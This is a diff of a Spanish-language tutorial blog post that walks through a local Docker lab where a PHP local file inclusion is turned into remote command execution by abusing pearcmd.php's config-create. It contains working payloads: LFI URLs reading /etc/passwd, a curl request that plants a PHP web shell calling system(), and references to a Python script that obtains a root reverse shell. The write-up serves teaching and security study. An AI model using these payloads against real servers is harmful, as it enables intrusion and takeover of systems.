@@ -28,7 +28,8 @@
 <li><a href="/es/posts/phplfitorce/#8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un script python (en vez de curl) para crear el archivo (.php)</a></li>
 </ul>
 <h2 id="1-objetivo">1. Objetivo</h2>
-<p>Vamos a probar como un LFI nos llevará a un RCE vía una vulnerabilidad de PHP.</p>
+<p>Vamos a probar como un LFI (<em>Local File Inclusion</em>) nos llevará a un RCE (<em>Remote Command Execution</em>) vía una vulnerabilidad de PHP.</p>
+<p>Básicamente, con el LFI podremos invocar un archivo muy particular de PHP que nos permitirá escribir en el sistema una <em>webshell</em> y luego con esta misma <em>webshell</em> podremos ejecutar comandos de sistema y ganar acceso al mismo.</p>
 <p>El problema existe hasta la versión PHP 7.3 y esto fue reportado en el año 2021.</p>
 
     <aside class="admonition note">
@@ -41,8 +42,9 @@
         <div class="admonition-content">La página está en otro idioma y John H. la ha traducido con Google al Inglés. Este documento lo he armado en base a su vídeo en YouTube.</div>
     </aside>
 <h3 id="11-laboratorio-local">1.1. Laboratorio local</h3>
+<p>Crearemos un laboratorio local en el que utilizaremos Docker. La primer prueba es creando la <em>webshell</em> directamente en el contenedor sin usar la &ldquo;vulnerabilidad&rdquo; de <em>php</em> y luego con el LFI demostrar cómo la podemos invocar. Luego sí, hacemos uso de la vulnerabilidad para directamente crear la <em>webshell</em>.</p>
 <p>Para hacer las pruebas nos vamos a crear una imagen Docker que cuente con PHP. A partir de esta imagen crearemos un contenedor Docker que contenga una página con un LFI (<em>Local File Inclusion</em>).</p>
-<p>Luego, abusaremos de un <em>.php</em> que existe por defecto y es una especie de consola, y según los parámetros que le demos ejecutará distintos comandos, por ejemplo: nos permite crear archivos. Podremos crear archivos con extensión <em>.php</em> que luego al solicitar con el navegador nos permitirá crear una webshell.</p>
+<p>Luego, abusaremos de un <em>.php</em> que existe por defecto y es una especie de consola, y según los parámetros que le demos ejecutará distintos comandos, por ejemplo: nos permite crear archivos. Podremos crear archivos con extensión <em>.php</em> que luego al solicitar con el navegador nos permitirá crear una <em>webshell</em>.</p>
 
     <aside class="admonition note">
         <div class="admonition-title">
@@ -70,7 +72,8 @@
 <li>Crear algunos archivos para testear</li>
 </ul>
 <h3 id="21-archivos-y-contenedores">2.1. Archivos y contenedores</h3>
-<p>Con nuestro <em>Dockerfile</em> crearemos una imagen y a partir de esta crearemos contenedores Docker (con 1 solo nos alcanza).</p>
+<p>Con nuestro <em>Dockerfile</em> crearemos una imagen y a partir de esta crearemos contenedores Docker (con 1 solo nos alcanza).
+Nuestra imagen contiene un servidor web PHP básico que escucha en el puerto 8000.</p>
 <p><strong>Archivo: Dockerfile</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">FROM php:7.0.0
 </span></span><span class="line"><span class="cl">COPY app/* /var/www/html/
@@ -88,21 +91,23 @@
 </span></span><span class="line"><span class="cl"> <span class="nx">phpinfo</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>Creamos el dir <strong>app/</strong> y movemos los archivos <em>.php</em> al mismo:
-<img src="../../../images/phplfitorce.es-4.png"></p>
+<img src="../../../images/phplfitorce.es-4.png">
+Estos 2 archivos son los que serán accesibles en nuestro <em>servidor web php</em>, pero abusando del LFI &ldquo;podremos llegar&rdquo; a otros archivos del sistema.</p>
 <h3 id="22-contenedor">2.2. Contenedor</h3>
 <h4 id="221-build-de-la-imagen-desde-nuestro-dockerfile">2.2.1. Build de la imagen desde nuestro Dockerfile</h4>
 <p>Usaremos el tag = LFi 2 RCE → <strong>phplfi2rce</strong></p>
 <pre tabindex="0"><code>docker build -t phplfi2rce .
 </code></pre><p>(hay un punto al final del comando indicando el directorio actual)</p>
-<p>Hacemos el build</p>
-<p><img src="../../../images/phplfitorce.es-5.png">
-Listamos las imágenes Docker disponibles localmente:</p>
+<p>Hacemos el build de la imagen:</p>
+<p><img src="../../../images/phplfitorce.es-5.png"></p>
+<p>Si ahora listamos las imágenes Docker disponibles localmente veremos la que hemos creado:</p>
 <pre tabindex="0"><code>docker images
 </code></pre><p><img src="../../../images/phplfitorce.es-6.png"></p>
 <h4 id="222-iniciamos-un-contenedor-usando-la-imagen-que-hemos-creado">2.2.2. Iniciamos un contenedor usando la imagen que hemos creado</h4>
-<p>Iniciar el contenedor:</p>
-<pre tabindex="0"><code>docker run -p 8000:8000 phplfi2rce
-</code></pre><h4 id="223-probamos-el-servicio-en-el-puerto-8000">2.2.3. Probamos el servicio en el puerto 8000</h4>
+<p>Para iniciar un nuevo contenedor desde la imagen &ldquo;phplfi2rce&rdquo; ejecutamos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -p 8000:8000 phplfi2rce
+</span></span></code></pre></div><p>(el puerto 8000 lo estamos mapeando en el mismo puerto 8000 del contenedor, donde escucha el <em>servidor web php</em>)</p>
+<h4 id="223-probamos-el-servicio-en-el-puerto-8000">2.2.3. Probamos el servicio en el puerto 8000</h4>
 <p>Visitamos nuestra página vulnerable <em>index.php</em></p>
 <p><img src="../../../images/phplfitorce.es-7.png"></p>
 <h4 id="224-comprobamos-el-lfi">2.2.4. Comprobamos el LFI</h4>
@@ -111,26 +116,27 @@ Listamos las imágenes Docker disponibles localmente:</p>
 <pre tabindex="0"><code>http://127.0.0.1:8000/index.php?file=/etc/passwd
 </code></pre><p>O lo que es lo mismo:</p>
 <pre tabindex="0"><code>http://localhost:8000/?file=/etc/passwd
-</code></pre><p><img src="../../../images/phplfitorce.es-8.png">
-En la consola vemos:</p>
+</code></pre><p><img src="../../../images/phplfitorce.es-8.png"></p>
+<p>En la consola vemos los <em>requests</em>:</p>
 <p><img src="../../../images/phplfitorce.es-9.png"></p>
 <h4 id="225-accedemos-al-phpinfophp">2.2.5. Accedemos al phpinfo.php</h4>
-<p>Visitamos la página del phpinfo.php</p>
+<p>Uno de los archivos que habíamos copiado al contenedor es el <em>phpinfo.php</em>, es decir está accesible en la raíz del servidor web.</p>
+<p>Visitemos la página del <em>phpinfo.php</em>.</p>
 <pre tabindex="0"><code>http://localhost:8000/phpinfo.php
 </code></pre><p><img src="../../../images/phplfitorce.es-10.png"></p>
 <h2 id="3-variables-argc-y-argv">3. Variables argc y argv</h2>
-<p>En la página del phpinfo.php, busquemos por las variables que hace referencia el blog (argc y argv)</p>
-<p>argc → contar argumentos</p>
-<p>argv → valores de los argumentos</p>
+<p>En la página del <em>phpinfo.php</em>, busquemos por las variables que hace referencia el blog (argc y argv)</p>
+<p><strong>argc</strong> → contar argumentos</p>
+<p><strong>argv</strong> → valores de los argumentos</p>
 <p><img src="../../../images/phplfitorce.es-11.png"></p>
 <p>La siguiente es un <em>array</em>:</p>
 <p><img src="../../../images/phplfitorce.es-12.png"></p>
 <p>Si en la URL le pasamos después del signo de pregunta &lsquo;?&rsquo; un texto como &ldquo;<em>cualquiercosa</em>&rdquo; lo veremos reflejado en el <em>array</em>.</p>
 <p><img src="../../../images/phplfitorce.es-13.png"></p>
-<p>Esta es la petición que llega al servidor web (un server PHP en el contenedor):</p>
+<p>Esta es la petición que llega al <em>servidor web php</em> en el contenedor:</p>
 <p><img src="../../../images/phplfitorce.es-14.png"></p>
 <h3 id="31-qué-ha-sucedido">3.1. Qué ha sucedido</h3>
-<p>El blog (traducido al inglés) explica lo siguiente:</p>
+<p>El blog (traducido al inglés y acá al español) explica lo siguiente:</p>
 <blockquote>
 <p>Si en la URL ponemos un texto, lo vemos reflejado en la página del <em>phpinfo</em>, es decir el texto que escribimos se está cargando en el contenido del array $_SERVER[&lsquo;argv&rsquo;].</p>
 </blockquote>
@@ -164,7 +170,8 @@ En la consola vemos:</p>
         </div>
         <div class="admonition-content">Una vez más, leer lo anterior, donde dice &ldquo;Qué ha sucedido&rdquo;.</div>
     </aside>
-<p>Si hacemos LFI de ese archivo <em>pearcmd.php</em> se invocará, es decir, se va a interpretar, pues tiene extensión PHP; y lo interesante es que a ese archivo le podemos pasar una lista de argumentos (de los que tiene habilitados el archivo), que podremos controlar a través del <em>output</em> que vemos en el <em>array</em> visto en el <em>phpinfo</em>.</p>
+<p><code>pearcmd.php</code> es un archivo relacionado con PEAR (PHP Extension and Application Repository), una herramienta de línea de comandos utilizada para manejar extensiones y librerías en PHP.</p>
+<p>Si hacemos LFI de ese archivo <em>pearcmd.php</em> se invocará, es decir, se va a interpretar, pues tiene extensión <em>php</em>; y lo interesante es que a ese archivo le podemos pasar una lista de argumentos (de los que tiene &ldquo;habilitados&rdquo; el archivo), que podremos controlar a través del <em>output</em> que vemos en el <em>array</em> visto en el <em>phpinfo</em>.</p>
 
     <aside class="admonition success">
         <div class="admonition-title">
@@ -176,9 +183,14 @@ En la consola vemos:</p>
         </div>
         <div class="admonition-content">Al escribir la salida del <em>array</em> (que vemos en el <em>phpinfo</em>) estamos escribiendo o eligiendo los argumentos que va a tomar el <em>pearcmd.php</em>.</div>
     </aside>
+<p>Info de ChatGPT:</p>
+<blockquote>
+<p><code>pearcmd.php</code> está diseñado para usarse en CLI, donde los argumentos se pasan desde la línea de comandos.
+Al cargarse mediante LFI, <strong>PHP trata los parámetros de la URL como si fueran argumentos CLI</strong>, asignándolos a <code>$_SERVER['argv']</code>.</p>
+</blockquote>
 <p>El archivo <em>pearcmd.php</em> está en la ruta: <em>/usr/local/lib/php</em></p>
-<p>Se invoca ejecutando:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php pearcmd.php
+<p>Desde <strong>consola</strong>, se invoca ejecutando:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">php /usr/local/lib/pearcmd.php
 </span></span></code></pre></div><h3 id="42-veamos-el-archivo-desde-dentro-del-contenedor">4.2. Veamos el archivo desde dentro del contenedor</h3>
 <h4 id="421-entramos-al-contenedor">4.2.1. Entramos al contenedor</h4>
 <p>Primero obtenemos el ID del contenedor</p>
@@ -275,14 +287,14 @@ Vemos en la imagen anterior que recibimos una conexión entrante en el <em>liste
 <p>Estamos en el contenedor:</p>
 <p><img src="../../../images/phplfitorce.es-31.png"></p>
 <h2 id="7-repetimos-y-creamos-el-archivo-ahora-haciendo-uso-del-lfi">7. Repetimos y creamos el archivo ahora haciendo uso del LFI</h2>
-<p>Crearemos el archivo en el contenedor usando el LFI que invocará a config-create de pearcmd.php.</p>
+<p>Crearemos el archivo en el contenedor usando el LFI que invocará a <em>config-create</em> de <em>pearcmd.php</em>.</p>
 <p>Es decir, ahora queremos hacer lo mismo que hicimos antes, pero:</p>
 <ol>
 <li>
-<p>Utilizando el <em>config-create</em> del pearcmd.php</p>
+<p>Utilizando el <em>config-create</em> del <em>pearcmd.php</em></p>
 </li>
 <li>
-<p>Desde fuera del contenedor</p>
+<p>Haciendo un <em>request</em> HTTP (originado fuera del contenedor)</p>
 </li>
 </ol>
 <p>Ahora vamos a escribir un archivo llamado <em>test2.php</em>.</p>
@@ -308,17 +320,18 @@ Vemos en la imagen anterior que recibimos una conexión entrante en el <em>liste
 </span></span><span class="line"><span class="cl">http://127.0.0.1:8000/index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/<span class="se">\&lt;</span>?<span class="o">=</span>system<span class="o">(</span>id<span class="o">)</span><span class="p">;</span>?<span class="se">\&gt;</span>+/tmp/test2.php
 </span></span></code></pre></div><p>En el log del servidor web del contenedor, vemos que los símbolos no llegan de forma correcta:</p>
 <p><img src="../../../images/phplfitorce.es-32.png"></p>
-<h3 id="71-usaremos-curl-para-crear-el-archivo">7.1. Usaremos curl para crear el archivo</h3>
-<p>En vez de usar el navegador para visitar la URL que usa el <em>config-create</em> y crea el archivo, usemos el comando <em>curl</em>.</p>
+<h3 id="71-usaremos-curl-para-hacer-el-request-y-crear-el-archivo">7.1. Usaremos curl para hacer el request y crear el archivo</h3>
+<p>En vez de usar el navegador para visitar la URL con el LFI y en la que usamos <em>config-create</em> para crear el archivo, usemos el comando <em>curl</em> (con el método GET).</p>
 <h4 id="711-primer-test-ejecución-del-comando-id">7.1.1. Primer test, ejecución del comando &lsquo;id&rsquo;</h4>
+<p>Creamos un archivo <em>test2.php</em> que contiene código <em>php</em> y ejecuta el comando &lsquo;id&rsquo;:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X GET <span class="s1">&#39;http://127.0.0.1:8000/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=system(id);?&gt;+/tmp/test2.php&#39;</span>
 </span></span></code></pre></div><p><img src="../../../images/phplfitorce.es-33.png"></p>
 <p><img src="../../../images/phplfitorce.es-34.png"></p>
 <p><img src="../../../images/phplfitorce.es-35.png"></p>
 <p>→ Nos dice que se creó al archivo <em>/tmp/test2.php</em></p>
-<p>En el <em>log</em>, vemos que llega bien (el request, la cadena de texto) al web server del contenedor:</p>
+<p>En el <em>log</em>, vemos que llega bien (el <em>request</em>, la cadena de texto) al <em>servidor web php</em> del contenedor:</p>
 <p><img src="../../../images/phplfitorce.es-36.png"></p>
-<p>Y si luego solicitamos la URL con el navegador usando <em>file=/tmp/test2.php</em> vemos que se ejecuta de forma correcta y nos da la salida del comando &lsquo;id&rsquo; como esperábamos:</p>
+<p>Y si luego solicitamos la URL con el navegador usando <em>file=/tmp/test2.php</em> vemos que se ejecuta de forma correcta y nos da la salida del comando &lsquo;id&rsquo; tal como esperábamos:</p>
 <p><img src="../../../images/phplfitorce.es-37.png"></p>
 <h4 id="712-hagamos-un-nuevo-archivo-con-parámetro-c">7.1.2. Hagamos un nuevo archivo con parámetro &lsquo;c&rsquo;</h4>
 <p>Podríamos crear el <em>test2.php</em> con el código necesario de una <em>web shell</em>, usando <em>curl</em>:</p>
@@ -403,7 +416,7 @@ Vemos en la imagen anterior que recibimos una conexión entrante en el <em>liste
 <p>Y si vamos al navegador, veremos:</p>
 <p><img src="../../../images/phplfitorce.es-56.png"></p>
 <p>Tenemos un <strong>Warning</strong> pues no le hemos pasado el valor, es decir el comando, a la variable &lsquo;c&rsquo;:</p>
-<h4 id="821-ejecutemos-el-comando-id">8.2.1. Ejecutemos el comando id</h4>
+<h4 id="821-ejecutemos-el-comando-id">8.2.1. Ejecutemos el comando: id</h4>
 <p>En la url tenemos que usar el LFI para invocar al archivo <em><strong>hello.php</strong>.</em></p>
 <pre tabindex="0"><code>http://localhost:8000/?file=/tmp/hello.php&amp;c=id
 </code></pre><p><img src="../../../images/phplfitorce.es-57.png"></p>
@@ -427,7 +440,7 @@ Prueba con un &lsquo;+&rsquo; para evitar el espacio en blanco pero tampoco func
 <p>→ vamos a hacerlo con <em>urlencode</em>; para eso, importamos la librería <em>urllib.parse</em></p>
 <p><img src="../../../images/phplfitorce.es-64.png"></p>
 <p><img src="../../../images/phplfitorce.es-65.png"></p>
-<p>Ejecutamos de nuevo el <em>hack.py</em> y recibimos la reverse shell:</p>
+<p>Ejecutamos de nuevo el <em>hack.py</em> y recibimos la <em>reverse shell</em>:</p>
 <p><img src="../../../images/phplfitorce.es-66.png"></p>
 <p><strong>¡Bien!, somos root:</strong></p>
 <p><img src="../../../images/phplfitorce.es-67.png"></p>
